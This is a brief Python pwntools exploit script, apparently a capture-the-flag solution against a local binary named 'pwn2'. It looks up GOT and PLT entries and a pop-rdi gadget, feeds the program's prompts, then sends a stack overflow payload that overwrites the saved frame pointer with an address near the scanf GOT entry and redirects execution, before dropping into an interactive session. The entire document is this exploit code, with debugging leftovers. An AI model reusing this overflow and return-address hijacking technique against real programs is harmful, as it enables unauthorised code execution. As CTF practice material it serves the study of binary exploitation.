from pwn import * 
from LibcSearcher import * 
context.log_level = 'debug'
p=process('./pwn2')
bin=ELF('./pwn2')
bss=bin.bss()+0x100
puts_got=bin.got['puts']
puts_plt=bin.plt['puts']
scanf_got=bin.got['__isoc99_scanf']
pop_rdi=0x0000000000401413 
def scanf1(avg):
    p.recvuntil(b'   [1] damage:\n')
    p.sendline(str(avg).encode())
def scanf2(avg):
    p.recvuntil(b'   [2] damage:\n')
    p.sendline(str(avg).encode())
def PUNCH(payload):
    gdb.attach(p)
    p.recvuntil(b'-------->-------------->-----------------> ONE PUNCH ------------>\n')
    p.send(payload)
# gdb.attach(p)
p.recvuntil(b'[*] Give me something...\n')
p.sendline(b'aaa')
p.recvuntil(b'[1] damage:\n')
p.sendline(b'2')
p.recvuntil(b'[2] damage:\n')
p.sendline(b'3')

PUNCH(b'a'*0x10+p64(scanf_got+0x40)+p64(0x000000000401319))
pause()
# p.recvuntil(b'[*] Give me something...\n')
p.send(b'')

p.interactive()

